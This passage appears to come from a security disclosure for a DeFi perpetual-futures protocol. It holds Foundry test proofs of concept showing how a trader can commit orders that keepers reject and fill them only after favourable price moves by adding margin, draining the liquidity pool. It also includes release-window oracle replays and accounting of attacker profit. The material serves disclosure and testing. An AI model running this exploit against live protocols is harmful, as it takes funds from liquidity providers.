  function _logU(string memory key, uint256 value) internal { emit log_named_uint(key, value); }

  function _keeperBalance() internal view returns (uint256) { return clearinghouse.balanceAssets(keeper); }

  function _treasury() internal view returns (uint256) { return clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT); }

  function _ledger(address who) internal view returns (uint256[16] memory s) {
    IMarginClearinghouse.PnlIsolationBuckets memory b = clearinghouse.getPnlIsolationBuckets(who);
    int256 vpi;
    (s[0], s[1],,,,, vpi) = engine.positions(who);
    (s[2], s[3]) = (uint256(vpi), settlementToken.balanceOf(who));
    (s[4], s[5], s[6]) = (b.settlementBalanceAssets, b.freeSettlementAssets, b.pnlPledgeAssets);
    (s[7], s[8]) = (b.liquidationReserveAssets, b.orderMarginAssets);
    (s[9], s[10]) = (b.actionReserveAssets, b.vpiRebateReserveAssets);
    (s[11], s[12]) = (engine.unsettledCarryAssets(who), engine.traderClaimBalanceAssets(who));
    (s[13], s[14], s[15]) = (pool.totalAssets(), _treasury(), _keeperBalance());
  }

  /// Wallet-to-wallet result; attacker, pool, treasury and keeper changes must sum to zero.
  function _account(uint256 startWallets, uint256 endWallets, uint256 poolStart, uint256 treasuryStart) internal returns (int256 net, int256 poolChange) {
    net = int256(endWallets) - int256(startWallets);
    poolChange = int256(pool.totalAssets()) - int256(poolStart);
    int256 treasuryChange = int256(_treasury()) - int256(treasuryStart);
    _logU("end wallets (atoms)", endWallets);
    _log("NET, wallet to wallet (atoms)", net);
    _log("HousePool change (atoms)", poolChange);
    _log("treasury change (atoms)", treasuryChange);
    _logU("keeper bounties (atoms)", _keeperBalance());
    _logU("attacker transactions", txMeter);
    _logU("attacker gas (Forge units)", gasMeter);
    assertEq(net + poolChange + treasuryChange + int256(_keeperBalance()), 0, "conservation");
  }

  // ---- increase route, synthetic shifts

  /// Small base positions (10 tokens of margin each); T is the commit time of the switch order.
  function _openTinyBases(bool withShort) internal {
    T = t0 + 300;
    _at(t0);
    _mark(0, t0 - 1);
    uint64 longId = _commit(trader, _request(LONG, TINY_BASE, 10e6, false));
    uint64 shortId = withShort ? _commit(trader2, _request(SHORT, TINY_BASE, 10e6, false)) : 0;
    _at(t0 + 2);
    _exec(trader, longId, _tick(0, t0 + 1, t0), FILLED);
    if (withShort) _exec(trader2, shortId, _tick(0, t0 + 1, t0), FILLED);
    _at(T);
    _mark(0, T - 1);
  }

  /// One snapshot, same first tick: A untouched; B after a third party's 100,000-token `depositFor`; C after the
  /// owner's `addMargin`. Only C fills. Returns A's receipt.
  function _decisive(address who, uint64 id, bytes[] memory first, uint256 cure, address executorA) internal returns (O.OrderReceipt memory a) {
    uint256 snapshot = vm.snapshotState();
    uint256 wealth = _wealth(who);
    uint256 size = _size(who);
    a = _execR(executorA, id, first, REJECTED);
    assertEq(uint8(a.failure.constraint), uint8(O.ConstraintKind.PostLeverage));
    assertGt(a.failure.actual, a.failure.limit);
    assertEq(_wealth(who), wealth, "costs the owner nothing");
    assertEq(_size(who), size);
    _logU("A post-trade leverage, no owner margin (bps)", a.failure.actual);
    _logU("A declared maxPostLeverageBps", a.failure.limit);
    vm.revertToState(snapshot);
    settlementToken.mint(keeper, 100_000e6);
    vm.startPrank(keeper);
    settlementToken.approve(address(clearinghouse), type(uint256).max);
    clearinghouse.depositFor(who, 100_000e6);
    vm.stopPrank();
    O.OrderReceipt memory b = _execR(keeper, id, first, REJECTED);
    assertEq(b.failure.actual, a.failure.actual, "donation changes nothing");
    vm.revertToState(snapshot);
    _addMargin(who, cure);
    O.OrderReceipt memory c = _execR(who, id, first, FILLED);
    assertEq(c.executionPrice, a.executionPrice);
  }

  function test_01_OwnerMarginAloneDecides() public {
    _fund(trader, BOUND_CAPITAL);
    _openTinyBases(false);
    uint64 id = _commit(trader, _increase(LONG, BOUND));
    (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(id);
    assertEq(pending.committedMarginAssets, BIG_MARGIN, "order margin reserved");
    assertEq(pending.executionBountyAssets, 200_000);
    _at(T + 10);
    _mark(2500, T + 9);
    _decisive(trader, id, _tick(0, T + 1, T), CURE, trader);
    assertEq(_size(trader), TINY_BASE + BIG_INCREASE);
  }

  function test_02_KeeperCanOnlyRejectAndOwnerExercisesAtomically() public {
    vm.prank(alice);
    OwnerSwitchAccount acct = new OwnerSwitchAccount(OrderRouter(address(router)), clearinghouse, IERC20(address(settlementToken)));
    address a = address(acct);
    settlementToken.mint(a, BOUND_CAPITAL);
    vm.prank(alice);
    acct.deposit(BOUND_CAPITAL);
    T = t0 + 300;
    _at(t0);
    _mark(0, t0 - 1);
    O.OrderRequest memory request = _request(LONG, TINY_BASE, 10e6, false);
    vm.prank(alice);
    uint64 id = acct.commit(request);
    _at(t0 + 2);
    vm.prank(alice);
    acct.execute(id, _tick(0, t0 + 1, t0), address(0), 0);
    _at(T);
    _mark(0, T - 1);
    request = _increase(LONG, BOUND);
    vm.prank(alice);
    id = acct.commit(request);
    uint256 wealth = _wealth(a) + _wealth(sybil);
    bytes[] memory first = _tick(0, T + 1, T);
    uint256 fork = vm.snapshotState();
    // Keeper first: can only reject.
    _at(T + 2);
    O.OrderReceipt memory receipt = _execR(keeper, id, first, REJECTED);
    assertEq(receipt.bountyRecipient, keeper);
    assertEq(wealth - (_wealth(a) + _wealth(sybil)), 200_000, "costs the 0.2 bounty");
    vm.revertToState(fork);
    // Favourable: addMargin + executeOrder atomically.
    _at(T + 3);
    _mark(-2500, T + 2);
    vm.prank(alice);
    O.ExecutionResult memory r = acct.execute(id, first, address(engine), CURE);
    assertEq(uint8(r.terminalReason), uint8(FILLED));
    assertEq(_size(a), TINY_BASE + BIG_INCREASE);
    vm.revertToState(fork);
    // Unfavourable: owner self-rejects.
    _at(T + 3);
    _mark(2500, T + 2);
    vm.prank(alice);
    r = acct.execute(id, first, address(0), 0);
    assertEq(uint8(r.terminalReason), uint8(REJECTED));
    assertEq(_wealth(a) + _wealth(sybil), wealth, "abandon is free");
    vm.revertToState(fork);
    // Second attacker address rejects.
    _at(T + 3);
    _mark(2500, T + 2);
    _exec(sybil, id, first, REJECTED);
    assertEq(_wealth(a) + _wealth(sybil), wealth, "bounty stays with the attacker");
  }

  function test_03_AbandonEqualsNeverCommitted() public {
    _fund(trader, BOUND_CAPITAL);
    _openTinyBases(false);
    vm.prank(trader);
    clearinghouse.withdrawMargin(0); // carry checkpoint, matched in both branches
    uint256 fork = vm.snapshotState();
    _at(T + 10);
    _mark(2500, T + 9);
    vm.prank(trader);
    clearinghouse.withdrawMargin(0);
    uint256[16] memory control = _ledger(trader);
    vm.revertToState(fork);
    uint64 id = _commit(trader, _increase(LONG, BOUND));
    _at(T + 10);
    _mark(2500, T + 9);
    _exec(trader, id, _tick(0, T + 1, T), REJECTED);
    vm.prank(trader);
    clearinghouse.withdrawMargin(0);
    uint256[16] memory abandoned = _ledger(trader);
    for (uint256 i; i < 16; ++i) {
      assertEq(abandoned[i], control[i], "equals never committing");
    }
  }

  function _unwindLong(int256 valuation, uint256 w0) internal returns (int256) {
    if (_size(trader) != 0) _closeSelf(trader, LONG, T + 5, valuation);
    return int256(_wealth(trader)) - int256(w0);
  }

  /// One path, four strategies. `seen`: move visible at T+3; `next`: tick pricing a fresh order; `valuation`: closing
  /// tick (ppm; negative favours the LONG).
  function _path(string memory label, int256 seen, int256 next, int256 valuation) internal {
    uint256 fork = vm.snapshotState();
    uint256 w0 = _wealth(trader);
    uint256 p0 = pool.totalAssets();
    bytes[] memory first = _tick(0, T + 1, T);
    bool fires = -seen >= RULE_PPM;
    emit log_string(label);
    uint64 id = _commit(trader, _increase(LONG, BOUND));
    _at(T + 3);
    if (fires) _addMargin(trader, CURE);
    _exec(trader, id, first, fires ? FILLED : REJECTED);
    _log("   switch, absolute wealth change (atoms)", _unwindLong(valuation, w0));
    _log("   pool, switch branch (atoms)", int256(pool.totalAssets()) - int256(p0));
    vm.revertToState(fork);
    id = _commit(trader, _increase(LONG, type(uint32).max));
    _at(T + 2);
    _exec(keeper, id, first, FILLED);
    _log("   binding order (atoms)", _unwindLong(valuation, w0));
    vm.revertToState(fork);
    _at(T + 3);
    if (fires) {
      id = _commit(trader, _increase(LONG, type(uint32).max));
      _at(T + 5);
      _exec(keeper, id, _tick(next, T + 4, T + 3), FILLED);
    }
    _log("   fresh order after observation (atoms)", _unwindLong(valuation, w0));
    vm.revertToState(fork);
    _at(T + 3);
    _log("   no order, base unwind only (atoms)", _unwindLong(valuation, w0));
    vm.revertToState(fork);
  }

  function test_04_SwitchVersusBindingAndFreshOrders() public {
    _fund(trader, BOUND_CAPITAL);
    _openTinyBases(false);
    _path("favourable 25 bp, persists", -2500, -2500, -2500);
    _path("favourable 25 bp, retraces to 5 bp before the close", -2500, -2500, -500);
    _path("favourable 25 bp, extends to 40 bp", -2500, -3000, -4000);
    _path("unfavourable 25 bp", 2500, 2500, 2500);
    _path("favourable 6 bp (below the rule)", -600, -600, -600);
    _path("flat", 0, 0, 0);
  }

  /// Exercise minus abandon when the basket moves `gap` ppm in the LONG's favour and stays there.
  function _exerciseMinusAbandon(uint64 id, int256 gap) internal returns (int256 delta) {
    uint256 fork = vm.snapshotState();
    bytes[] memory first = _tick(0, T + 1, T);
    _at(T + 3);
    _mark(-gap, T + 2);
    _addMargin(trader, CURE);
    _exec(trader, id, first, FILLED);
    _closeSelf(trader, LONG, T + 4, -gap);
    uint256 exercised = _wealth(trader);
    vm.revertToState(fork);
    _at(T + 3);
    _mark(-gap, T + 2);
    _exec(trader, id, first, REJECTED);
    _closeSelf(trader, LONG, T + 4, -gap);
    delta = int256(exercised) - int256(_wealth(trader));
    vm.revertToState(fork);
  }

  function test_08_BreakEvenMove() public {
    _fund(trader, BOUND_CAPITAL);
    _openTinyBases(false);
    uint64 id = _commit(trader, _increase(LONG, BOUND));
    int256 lo;
    int256 hi = 5000;
    while (hi - lo > 2) {
      int256 mid = (lo + hi) / 2;
      if (_exerciseMinusAbandon(id, mid) > 0) hi = mid;
      else lo = mid;
    }
    _log("break-even favourable move (ppm)", hi);
  }

  function test_09_TwoSided() public {
    _fund(trader, BOUND_CAPITAL);
    _fund(trader2, BOUND_CAPITAL);
    _openTinyBases(true);
    uint64 longId = _commit(trader, _increase(LONG, BOUND));
    uint64 shortId = _commit(trader2, _increase(SHORT, BOUND));
    uint256 w0 = _wealth(trader) + _wealth(trader2);
    bytes[] memory first = _tick(0, T + 1, T);
    uint256 fork = vm.snapshotState();
    _at(T + 3);
    _mark(-5000, T + 2);
    _addMargin(trader, CURE);
    _exec(trader, longId, first, FILLED);
    _exec(trader2, shortId, first, REJECTED);
    _closeSelf(trader, LONG, T + 4, -5000);
    _closeSelf(trader2, SHORT, T + 7, -5000);
    _log("basket -50 bp: combined attacker change (atoms)", int256(_wealth(trader) + _wealth(trader2)) - int256(w0));
    assertGt(_wealth(trader) + _wealth(trader2), w0);
    vm.revertToState(fork);
    // FIFO: reject the earlier LONG first, then exercise the SHORT.
    _at(T + 3);
    _mark(5000, T + 2);
    _exec(trader, longId, first, REJECTED);
    _addMargin(trader2, CURE);
    _exec(trader2, shortId, first, FILLED);
    _closeSelf(trader2, SHORT, T + 4, 5000);
    _closeSelf(trader, LONG, T + 7, 5000);
    _log("basket +50 bp: combined attacker change (atoms)", int256(_wealth(trader) + _wealth(trader2)) - int256(w0));
    assertGt(_wealth(trader) + _wealth(trader2), w0);
  }

  /// SC-M4's first-tick rule holds, and the fill needs no withdrawable balance to pay costs.
  function test_12b_SurvivesFirstTickRuleAndCostEscrow() public {
    _fund(trader, BOUND_CAPITAL);
    _openTinyBases(false);
    uint64 id = _commit(trader, _increase(LONG, BOUND));
    uint256 free = _free(trader);
    vm.prank(trader);
    clearinghouse.withdrawMargin(free - CURE);
    _at(T + 5);
    _addMargin(trader, CURE);
    assertEq(_free(trader), 0, "no free settlement left");
    vm.prank(trader);
    O.ExecutionResult memory r = router.executeOrder(id, _tick(-2500, T + 4, T + 3));
    assertEq(uint8(r.status), uint8(O.LifecycleStatus.Pending), "later tick refused");
    assertEq(uint8(r.pendingReason), uint8(O.PendingReason.HistoricalPriceUnavailable), "first tick only");
    _exec(trader, id, _tick(0, T + 1, T), FILLED);
    assertEq(_size(trader), TINY_BASE + BIG_INCREASE);
  }

  // ---- increase route, release replay

  function _releaseSetup(uint8 ev) internal {
    _mint(trader, BOUND_CAPITAL);
    _mint(trader2, BOUND_CAPITAL);
    _at(t0);
    router.updateMarkPrice(_relTick(ev, 0, t0 - 1, t0 - 2));
    _deposit(trader, BOUND_CAPITAL);
    _deposit(trader2, BOUND_CAPITAL);
    uint64 longBase = _commit(trader, _request(LONG, TINY_BASE, 10e6, false));
    uint64 shortBase = _commit(trader2, _request(SHORT, TINY_BASE, 10e6, false));
    _at(t0 + 2);
    _exec(keeper, longBase, _relTick(ev, 0, t0 + 1, t0), FILLED);
    _exec(keeper, shortBase, _relTick(ev, 0, t0 + 1, t0), FILLED);
  }

  function _toRelease(uint8 ev, uint256 release) internal {
    _at(release - 1);
    router.updateMarkPrice(_relTick(ev, 0, release - 1, release - 2));
    _at(release);
  }

  function test_07_AuthenticRelease_FullyAccounted() public {
    uint256 poolStart = pool.totalAssets();
    uint256 treasuryStart = _treasury();
    _releaseSetup(0);
    // Nineteen earlier two-sided attempts, each rejected by a keeper.
    for (uint256 i = 1; i <= 19; ++i) {
      uint256 c = t0 + 300 * i;
      _at(c);
      uint64 a = _commit(trader, _increase(LONG, BOUND));
      uint64 b = _commit(trader2, _increase(SHORT, BOUND));
      _at(c + 2);
      _exec(keeper, a, _relTick(0, 0, c + 1, c), REJECTED);
      _exec(keeper, b, _relTick(0, 0, c + 1, c), REJECTED);
    }
    uint256 beforeRelease = _wealth(trader) + _wealth(trader2);
    uint256 release = t0 + 6000;
    _toRelease(0, release);
    uint64 longId = _commit(trader, _increase(LONG, BOUND));
    uint64 shortId = _commit(trader2, _increase(SHORT, BOUND));
    bytes[] memory first = _relTick(0, 2, release + 1, release);
    {
      // Control: keeper first at the release.
      uint256 fork = vm.snapshotState();
      _at(release + 2);
      _exec(keeper, longId, first, REJECTED);
      _exec(keeper, shortId, first, REJECTED);
      assertEq(beforeRelease - (_wealth(trader) + _wealth(trader2)), 400_000, "two bounties");
      vm.revertToState(fork);
    }
    _at(release + 2);
    assertGe(-_seenPpm(first, _relTick(0, 3, release + 2, release + 1)), RULE_PPM);
    _addMargin(trader, CURE);
    _exec(trader, longId, first, FILLED);
    _exec(trader2, shortId, first, REJECTED);
    uint64 closeId = _commit(trader, _request(LONG, _size(trader), 0, true));
    _at(release + 4);
    _exec(keeper, closeId, _relTick(0, 4, release + 3, release + 2), FILLED);
    _closeAll(trader2, SHORT, release + 4, keeper, _relTick(0, 6, release + 5, release + 4));
    _withdrawAll(trader);
    _withdrawAll(trader2);
    assertEq(clearinghouse.balanceAssets(trader) + clearinghouse.balanceAssets(trader2), 0);
    _logU("bases and 19 rejected two-sided attempts cost (atoms)", 2 * BOUND_CAPITAL - beforeRelease);
    (int256 net,) = _account(2 * BOUND_CAPITAL, settlementToken.balanceOf(trader) + settlementToken.balanceOf(trader2), poolStart, treasuryStart);
    assertGt(net, 0);
  }

  function _unwindBoth(uint256 release, uint256 w0, string memory label) internal {
    _closeAll(trader, LONG, release + 4, keeper, _relTick(0, 6, release + 5, release + 4));
    _closeAll(trader2, SHORT, release + 7, keeper, _relTick(0, 6, release + 8, release + 7));
    _log(label, int256(_wealth(trader) + _wealth(trader2)) - int256(w0));
  }

  function test_14_AuthenticPath_SwitchVersusBindingAndFresh() public {
    _releaseSetup(0);
    uint256 release = t0 + 600;
    _toRelease(0, release);
    uint256 w0 = _wealth(trader) + _wealth(trader2);
    bytes[] memory first = _relTick(0, 2, release + 1, release);
    uint256 fork = vm.snapshotState();
    uint64 longId = _commit(trader, _increase(LONG, BOUND));
    uint64 shortId = _commit(trader2, _increase(SHORT, BOUND));
    _at(release + 2);
    _addMargin(trader, CURE);
    _exec(trader, longId, first, FILLED);
    _exec(trader2, shortId, first, REJECTED);
    _unwindBoth(release, w0, "switch on both sides, absolute change (atoms)");
    vm.revertToState(fork);
    longId = _commit(trader, _increase(LONG, type(uint32).max));
    shortId = _commit(trader2, _increase(SHORT, type(uint32).max));
    _at(release + 2);
    _exec(keeper, longId, first, FILLED);
    _exec(keeper, shortId, first, FILLED);
    _unwindBoth(release, w0, "binding LONG and SHORT (atoms)");
    vm.revertToState(fork);
    _at(release + 2);
    longId = _commit(trader, _increase(LONG, type(uint32).max));
    _at(release + 4);
    _exec(keeper, longId, _relTick(0, 4, release + 3, release + 2), FILLED);
    _unwindBoth(release, w0, "fresh LONG after observation (atoms)");
  }

  // ---- sensitivity and the rejected-close lifecycle

  struct Scenario {
    uint8 ev;
    address who;
    CfdTypes.Side side;
    uint256 othersPct;
    uint256 confPct;
    uint256 exitExtra; // seconds before the close is committed
  }

  function _varTick(Scenario memory q, uint8 k, uint256 pt, uint256 prev) internal view returns (bytes[] memory) {
    (uint256[6] memory price, uint256[6] memory conf) = _relVar(q.ev, k, q.othersPct, q.confPct);
    return _encode(price, conf, true, pt, prev);
  }

  function _basketVar(Scenario memory q, uint8 k) internal view returns (uint256 basket, uint256 confidence) {
    (uint256[6] memory price, uint256[6] memory conf) = _relVar(q.ev, k, q.othersPct, q.confPct);
    return _basket(price, conf);
  }

  /// Move of tick k against the entry tick (row 2), signed in the side's favour.
  function _favourable(Scenario memory q, uint8 k) internal view returns (int256 ppm) {
    (uint256 entry,) = _basketVar(q, 2);
    (uint256 seen,) = _basketVar(q, k);
    ppm = (int256(seen) - int256(entry)) * 1e6 / int256(entry);
    if (q.side == LONG) ppm = -ppm;
  }

  function _tryClose(address who, uint64 closeId, bytes[] memory tick) internal returns (bool executed) {
    vm.prank(who);
    try router.executeOrder(closeId, tick) returns (O.ExecutionResult memory r) {
      executed = r.terminalReason == FILLED;
    } catch {}
  }

  /// Applies the rule at ticks R+2..R+4 using only published ticks, exercises, then closes as the contracts allow:
  /// if the oracle rejects a close's one eligible tick, the close stays pending, cannot be replaced, and can only be
  /// expired after its window and recommitted.
  function _lifecycleRun(uint64 id, uint256 release, Scenario memory q, string memory label) internal {
    uint256 fork = vm.snapshotState();
    uint256 w0 = _wealth(q.who);
    uint256 p0 = pool.totalAssets();
    uint8 fired;
    for (uint8 s = 2; s <= 4 && fired == 0; ++s) {
      if (_favourable(q, s + 1) >= RULE_PPM) fired = s;
    }
    if (fired == 0) {
      emit log_named_string(label, "rule does not fire");
      return;
    }
    _at(release + fired);
    _addMargin(q.who, CURE);
    _exec(q.who, id, _varTick(q, 2, release + 1, release), FILLED);
    uint256 size = _size(q.who);
    uint256 commitSecond = release + fired + q.exitExtra;
    uint256 rejections;
    uint8 k;
    while (true) {
      _at(commitSecond);
      O.OrderRequest memory request = _request(q.side, size, 0, true);
      request.bounds.executionWindowSeconds = CLOSE_WINDOW;
      uint64 closeId = _commit(q.who, request);
      require(commitSecond + 2 - release <= (q.ev == 2 ? 9 : 7), "tick not embedded");
      k = uint8(commitSecond + 2 - release);
      _at(commitSecond + 1);
      if (_tryClose(q.who, closeId, _varTick(q, k, commitSecond + 1, commitSecond))) break;
      ++rejections;
      (uint256 basket, uint256 confidence) = _basketVar(q, k);
      assertGt(confidence * 10_000, basket * 10, "confidence limit");
      (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(closeId);
      assertEq(pending.orderId, closeId);
      _at(commitSecond + 2);
      assertFalse(_tryClose(q.who, closeId, _varTick(q, k + 1, commitSecond + 2, commitSecond + 1)), "later tick cannot fill");
      request = _request(q.side, size, 0, true);
      request.bounds.executionWindowSeconds = CLOSE_WINDOW;
      vm.expectRevert();
      vm.prank(q.who);
      router.commitOrder(request);
      vm.expectRevert();
      vm.prank(q.who);
      router.expireOrder(closeId);
      _at(commitSecond + CLOSE_WINDOW + 1);
      vm.prank(q.who);
      O.ExecutionResult memory r = router.expireOrder(closeId);
      assertEq(uint8(r.terminalReason), uint8(O.TerminalReason.Expired));
      commitSecond += CLOSE_WINDOW + 1;
    }
    assertEq(_size(q.who), 0);
    label = string.concat(label, ": fires at R+", vm.toString(uint256(fired)), ", closes at tick R+", vm.toString(uint256(k) - 1));
    if (rejections != 0) label = string.concat(label, " after ", vm.toString(rejections), " rejected close(s), expired and recommitted");
    _log(string.concat(label, " -> attacker (atoms)"), int256(_wealth(q.who)) - int256(w0));
    _log("      pool (atoms)", int256(pool.totalAssets()) - int256(p0));
    vm.revertToState(fork);
  }

  function _run(uint64 id, uint256 release, Scenario memory q, uint256 othersPct, uint256 confPct, uint256 exitExtra, string memory label) internal {
    (q.othersPct, q.confPct, q.exitExtra) = (othersPct, confPct, exitExtra);
    _lifecycleRun(id, release, q, label);
  }

  function _releaseCommit(uint8 ev, address who, CfdTypes.Side side) internal returns (uint64 id, uint256 release) {
    _releaseSetup(ev);
    release = t0 + 600;
    _toRelease(ev, release);
    id = _commit(who, _increase(side, BOUND));
  }

  function test_15_ReleaseReplaySensitivity() public {
    for (uint8 k; k < 8; ++k) {
      (uint256[6] memory a,) = _rel(0, k);
      (uint256[6] memory b,) = _relVar(0, k, 100, 100);
      for (uint256 i; i < 6; ++i) {
        assertApproxEqAbs(a[i], b[i], 1, "central model");
      }
    }
    (uint64 id, uint256 release) = _releaseCommit(0, trader, LONG);
    uint256 fork = vm.snapshotState();
    _at(release + 2);
    (uint256[6] memory p, uint256[6] memory c) = _rel(0, 2);
    (uint256 computed,) = _basket(p, c);
    assertEq(computed, _observe(_relTick(0, 2, release + 1, release)), "matches the oracle");
    vm.revertToState(fork);
    Scenario memory q = Scenario(0, trader, LONG, 100, 100, 0);
    _run(id, release, q, 100, 100, 0, "central");
    _run(id, release, q, 150, 100, 0, "four feeds move 1.5x");
    _run(id, release, q, 50, 100, 0, "four feeds move half as much");
    _run(id, release, q, 0, 100, 0, "four feeds do not move");
    _run(id, release, q, 100, 64, 0, "confidence at the median ratio");
    _run(id, release, q, 100, 200, 0, "confidence doubled");
    _run(id, release, q, 100, 100, 1, "exit 1 s later");
    _run(id, release, q, 100, 100, 2, "exit 2 s later");
    _run(id, release, q, 100, 100, 3, "exit 3 s later");
    _run(id, release, q, 50, 200, 1, "half move, confidence doubled, exit 1 s later");
    _run(id, release, q, 0, 200, 1, "no move, confidence doubled, exit 1 s later");
  }

  function test_16_RejectedCloseLifecycle() public {
    (uint64 id, uint256 release) = _releaseCommit(2, trader2, SHORT);
    Scenario memory q = Scenario(2, trader2, SHORT, 100, 100, 0);
    _run(id, release, q, 100, 100, 0, "2026-08-07 central");
    _run(id, release, q, 100, 200, 0, "2026-08-07 confidence doubled");
    _run(id, release, q, 0, 200, 0, "2026-08-07 no move, confidence doubled");
    _run(id, release, q, 100, 200, 1, "2026-08-07 confidence doubled, exit 1 s later");
  }

  // ---- partial-close route

  /// The holder's existing 2,000,000-unit SHORT.
  function _inventory() internal {
    T = t0 + 300;
    _fund(holder, INV_CAPITAL);
    _at(t0);
    _mark(0, t0 - 1);
    uint64 id = _commit(holder, _request(SHORT, INV_SIZE, INV_MARGIN, false));
    _at(t0 + 2);
    _exec(keeper, id, _tick(0, t0 + 1, t0), FILLED);
    _at(T);
    _mark(0, T - 1);
  }

  /// Partial close leaving 1,100 units, leverage ceiling at 70% of present leverage; cure = 60% of present pledge.
  function _switchClose() internal view returns (O.OrderRequest memory request, uint256 cure) {
    uint256 pledge = clearinghouse.pnlPledgeAssets(holder);
    uint256 notional = (_size(holder) / 1e20) * engine.lastMarkPrice();
    request = _request(SHORT, _size(holder) - RESIDUAL, 0, true);
    request.bounds.maxPostLeverageBps = uint32((notional * 10_000 / pledge) * 70 / 100);
    cure = pledge * 60 / 100;
  }

  function test_C01_OwnerMarginAloneDecidesThePartialClose() public {
    _inventory();
    (O.OrderRequest memory request, uint256 cure) = _switchClose();
    uint64 id = _commit(holder, request);
    _at(T + 3);
    assertLt(engine.lastMarkTime(), T + 1, "no newer mark cached");
    O.OrderReceipt memory a = _decisive(holder, id, _tick(0, T + 1, T), cure, keeper);
    assertEq(a.bountyAssets, 0, "a close has no bounty");
    assertEq(_keeperBalance(), 200_000);
    assertEq(_size(holder), RESIDUAL);
  }

  function test_C05_AuthenticRelease_FullyAccounted() public {
    uint256 poolStart = pool.totalAssets();
    uint256 treasuryStart = _treasury();
    _mint(holder, INV_CAPITAL);
    _at(t0);
    router.updateMarkPrice(_relTick(0, 0, t0 - 1, t0 - 2));
    _deposit(holder, INV_CAPITAL);
    uint64 id = _commit(holder, _request(SHORT, INV_SIZE, INV_MARGIN, false));
    _at(t0 + 2);
    _exec(keeper, id, _relTick(0, 0, t0 + 1, t0), FILLED);
    uint256 afterOpen = _wealth(holder);
    // Nineteen earlier attempts, each rejected by a keeper.
    for (uint256 i = 1; i <= 19; ++i) {
      uint256 c = t0 + 300 * i;
      _at(c);
      (O.OrderRequest memory attempt,) = _switchClose();
      id = _commit(holder, attempt);
      _at(c + 2);
      _exec(keeper, id, _relTick(0, 0, c + 1, c), REJECTED);
    }
    _logU("carry over the 19 rejected attempts (atoms)", afterOpen - _wealth(holder));
    assertEq(_keeperBalance(), 200_000);
    uint256 release = t0 + 6000;
    _toRelease(0, release);
    bytes[] memory first = _relTick(0, 2, release + 1, release);
    // Control: no pending order; the holder closes after observing the move (tick R+3).
    uint256 fork = vm.snapshotState();
    _closeAll(holder, SHORT, release + 2, keeper, _relTick(0, 4, release + 3, release + 2));
    _withdrawAll(holder);
    int256 controlNet = int256(settlementToken.balanceOf(holder)) - int256(INV_CAPITAL);
    int256 controlPool = int256(pool.totalAssets()) - int256(poolStart);
    vm.revertToState(fork);
    (O.OrderRequest memory request, uint256 cure) = _switchClose();
    id = _commit(holder, request);
    fork = vm.snapshotState();
    uint256 w = _wealth(holder);
    _at(release + 2);
    _exec(keeper, id, first, REJECTED);
    assertEq(_wealth(holder), w, "keeper-first is free");
    vm.revertToState(fork);
    _at(release + 2);
    assertGe(-_seenPpm(first, _relTick(0, 3, release + 2, release + 1)), RULE_PPM);
    _addMargin(holder, cure);
    O.OrderReceipt memory receipt = _execR(holder, id, first, FILLED);
    _logU("exit price, fixed at tick R+1 (8 dec)", receipt.executionPrice);
    uint64 restId = _commit(holder, _request(SHORT, _size(holder), 0, true));
    _at(release + 4);
    _exec(keeper, restId, _relTick(0, 4, release + 3, release + 2), FILLED);
    _withdrawAll(holder);
    assertEq(clearinghouse.balanceAssets(holder), 0);
    (int256 net, int256 poolChange) = _account(INV_CAPITAL, settlementToken.balanceOf(holder), poolStart, treasuryStart);
    _log("net without any pending order (atoms)", controlNet);
    _log("difference attributable to the switch (atoms)", net - controlNet);
    _log("HousePool change without any pending order (atoms)", controlPool);
    assertGt(net - controlNet, 1500e6);
    assertLt(poolChange, controlPool - 1500e6);
  }

  function _increaseReverts(bytes4 err) internal {
    O.OrderRequest memory increase = _increase(SHORT, BOUND);
    vm.prank(holder);
    vm.expectRevert(err);
    router.commitOrder(increase);
  }

  /// The keeper can only reject; after the owner's addMargin the same order fills.
  function _ownerOnlyExit() internal {
    (O.OrderRequest memory request, uint256 cure) = _switchClose();
    uint64 id = _commit(holder, request);
    _at(T + 3);
    bytes[] memory first = _tick(0, T + 1, T);
    uint256 fork = vm.snapshotState();
    _exec(keeper, id, first, REJECTED);
    vm.revertToState(fork);
    _addMargin(holder, cure);
    _exec(holder, id, first, FILLED);
    assertEq(_size(holder), RESIDUAL);
  }

  function test_C06_AvailableWhileRouterIsPaused() public {
    _inventory();
    routerAdmin.pause();
    _increaseReverts(Pausable.EnforcedPause.selector);
    _ownerOnlyExit();
  }

  function test_C07_AvailableInCloseOnlyFadWindow() public {
    _inventory();
    _addMargin(holder, 30_000e6);
    T = 1_710_535_200;
    _at(T);
    _mark(0, T - 1);
    assertTrue(engine.isFadWindow());
    assertFalse(engine.isOracleFrozen());
    _increaseReverts(IOrderRouterErrors.OrderRouter__CloseOnlyWindow.selector);
    _ownerOnlyExit();
  }

  /// A rejected close pays no bounty (a rejected increase costs 0.2 tokens: test 02).
  function test_C08_KeeperRejectionOfTheCloseIsFree() public {
    _inventory();
    uint256 keeperBefore = _keeperBalance();
    (O.OrderRequest memory request,) = _switchClose();
    uint64 id = _commit(holder, request);
    uint256 w = _wealth(holder);
    _at(T + 2);
    _exec(keeper, id, _tick(0, T + 1, T), REJECTED);
    assertEq(_wealth(holder), w, "holder pays nothing");
    assertEq(_keeperBalance(), keeperBefore, "keeper is paid nothing");
  }

  function test_C09_EquityFloorIsASecondSwitch() public {
    _inventory();
    uint256 pledge = clearinghouse.pnlPledgeAssets(holder);
    O.OrderRequest memory request = _request(SHORT, INV_SIZE / 2, 0, true);
    request.bounds.minPostPositionEquityAssets = pledge * 70 / 100;
    uint64 id = _commit(holder, request);
    _at(T + 3);
    bytes[] memory first = _tick(0, T + 1, T);
    uint256 fork = vm.snapshotState();
    O.OrderReceipt memory a = _execR(keeper, id, first, REJECTED);
    assertEq(uint8(a.failure.constraint), uint8(O.ConstraintKind.PostPositionEquity));
    assertLt(a.failure.actual, a.failure.limit);
    vm.revertToState(fork);
    _addMargin(holder, pledge);
    _exec(holder, id, first, FILLED);
    assertEq(_size(holder), INV_SIZE / 2);
  }
}
```

The release-window figures in Impact Details come from the script below. It embeds the EUR/USD and USD/JPY ticks of the ten windows in which the rule can fire and the keeper delay sample, needs no credentials, and runs with `python3 release_model.py`.

```python
"""Release-window model for the owner-switch finding. Self-contained; no credentials.

DATA  {R: [EUR/USD price, conf, USD/JPY price, conf] for seconds R+1..R+9}: Pyth first-of-second ticks (expo -5, -3)
      after each weekday 08:30 ET second R. Of 109 windows examined only these ten can reach the 8.5 bp rule under
      any scenario below; in the other 99 no position is opened.
